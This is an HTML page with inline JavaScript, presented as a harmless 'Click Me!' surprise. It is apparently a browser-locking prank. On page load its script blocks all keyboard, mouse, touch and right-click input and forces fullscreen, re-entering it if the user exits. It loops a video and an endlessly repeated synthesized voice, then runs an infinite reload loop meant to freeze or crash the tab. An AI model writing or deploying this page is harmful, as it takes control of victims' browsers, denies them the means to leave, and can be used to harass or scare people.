<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me!</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>WELCOME</h1>
        <p>Click the button below for a surprise</p>
        <button id="prankButton" class="prank-button">CLICK ME</button>
        <div id="videoContainer" style="display: none; margin-top: 20px;"></div>
    </div>

    <script>
        const button = document.getElementById('prankButton');
        const videoContainer = document.getElementById('videoContainer');

        async function startChaos() {
            if (button) {
                button.style.display = 'none';
            }
            videoContainer.style.display = 'block';
            
            // Block all keyboard inputs
            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block all mouse clicks and touches
            document.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            document.addEventListener('mousedown', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            document.addEventListener('touchstart', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block right-click
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Block fullscreen exit
            document.addEventListener('fullscreenchange', (e) => {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(e => {});
                }
            });
            
            document.documentElement.requestFullscreen().catch(e => {});
            
            try {
                const response = await fetch('base64.txt');
                const base64String = await response.text();
                const videoSrc = 'data:video/mp4;base64,' + base64String;
                
                // Create audio context for amplification
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                
                // Create 1 video element with amplified audio
                const video = document.createElement('video');
                video.src = videoSrc;
                video.width = 560;
                video.height = 315;
                video.volume = 1.0;
                video.loop = true;
                videoContainer.appendChild(video);
                
                // Connect to audio context for normal volume
                const source = audioContext.createMediaElementSource(video);
                const gainNode = audioContext.createGain();
                gainNode.gain.value = 1.0; // Normal volume
                source.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                video.play().catch(e => {
                    console.log('Autoplay blocked');
                });
                
                // Add automated voice - repeat one message
                const message = "form";
                
                function speakRepeat() {
                    const utterance = new SpeechSynthesisUtterance(message);
                    utterance.volume = 1.0;
                    utterance.rate = 1.0;
                    utterance.pitch = 1.0;
                    utterance.onend = () => {
                        setTimeout(speakRepeat, 100);
                    };
                    speechSynthesis.speak(utterance);
                }
                speakRepeat();
            } catch (e) {
                console.error('Failed to load video:', e);
            }
            
            setTimeout(() => {
                while(1) location.reload(1);
            }, 1000);
        }

        button.addEventListener('click', startChaos);

        // Auto-start on page load (so it continues after crash/reload)
        window.addEventListener('load', () => {
            startChaos();
        });
    </script>
</body>
</html>
